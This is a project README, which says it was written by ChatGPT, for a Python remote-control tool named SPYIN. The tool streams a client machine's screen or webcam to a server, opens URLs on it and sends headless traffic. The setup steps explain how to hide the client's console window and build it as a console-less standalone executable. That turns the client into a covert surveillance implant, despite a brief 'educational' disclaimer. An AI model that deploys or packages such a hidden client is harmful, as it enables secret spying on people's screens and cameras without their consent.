# Remote Command and Streaming Server README

## Overview

This project consists of a server and client application to manage remote commands and stream either the screen or camera feed from a client machine. The server allows for sending various commands to connected clients, including starting/stopping screen or camera streams, opening URLs, and managing multiple clients.

The server listens for client connections and enables interaction via a terminal, where commands can be issued. The client connects to the server and listens for incoming commands.

## Features

- Stream screen or camera feed from client machines.
- Open URLs in a browser or send traffic to them without opening the browser.
- Manage multiple connected clients.
- Issue commands to start or stop streams and handle URL navigation.
- Simple and interactive command-line interface with color-coded output.

## Requirements

- Python 3.x
- `vidstream` library
- `colorama` for color-coded terminal output (optional but recommended)
- `requests` for handling HTTP requests (for headless URL traffic)
- `webbrowser` for opening URLs in the default web browser
- `opencv-python` (cv2) for managing camera devices on the client
- `pyinstaller` for packaging the client application

## Server Setup

1.  Clone the repository:

    bash

    Copy code

    `git clone https://github.com/M-416U/SPYIN.git cd SPYIN`

2.  Install dependencies:

    bash

    Copy code

    `pip install -r requirements.txt`

3.  Run the server:

    bash

    Copy code

    `python server.py`

The server will start listening for connections on port 9999 for commands and port 9998 for streaming.

## Client Setup

1.  Clone the client repository:

    bash

    Copy code

    `git clone https://github.com/M-416U/SPYIN.git cd SPYIN`

2.  Install dependencies:

    bash

    Copy code

    `pip install -r requirements.txt`

3.  Update the server IP address in the `client.py` file:

    python

    Copy code

    `ip_address = "192.168.1.3"  # Replace with your server's IP address`

4.  Run the client:

    bash

    Copy code

    `python client.py`

### Running the Client in the Background (Optional)

To make the client run in the background (without a visible console window), uncomment the `hide_console_window()` function in `client.py`.

python

Copy code

`# Uncomment this to hide the console window hide_console_window()`

### Building the Client with PyInstaller

1.  Install PyInstaller:

    bash

    Copy code

    `pip install pyinstaller`

2.  Build the client into a standalone executable:

    bash

    Copy code

    `pyinstaller --onefile --noconsole client.py`

3.  After building, you will find the standalone executable in the `dist` directory. You can run this on the client machine without requiring a Python installation.

## Available Commands (Server-Side)

Once the server is running, you can use the following commands to interact with clients:

| Command                   | Description                                                 |
| ------------------------- | ----------------------------------------------------------- |
| `start stream`            | Start streaming the client's screen                         |
| `start camera`            | Start streaming the client's camera feed                    |
| `stop stream`             | Stop the screen stream                                      |
| `stop camera`             | Stop the camera stream                                      |
| `open url <URL>`          | Open the specified URL in the client's browser              |
| `open url headless <URL>` | Send traffic to the specified URL without opening a browser |
| `show clients`            | Show the list of connected clients                          |
| `select client <ID>`      | Select a client to send commands to                         |
| `help`                    | Show the help message                                       |

## Contributing

If you want to contribute to this project, feel free to open a pull request or submit an issue.

---

**Disclaimer:** This project is for educational purposes. Be responsible when using remote access tools. Ensure you have permission to control any remote machine.
**Disclaimer:** This Readme file created by chatgpt
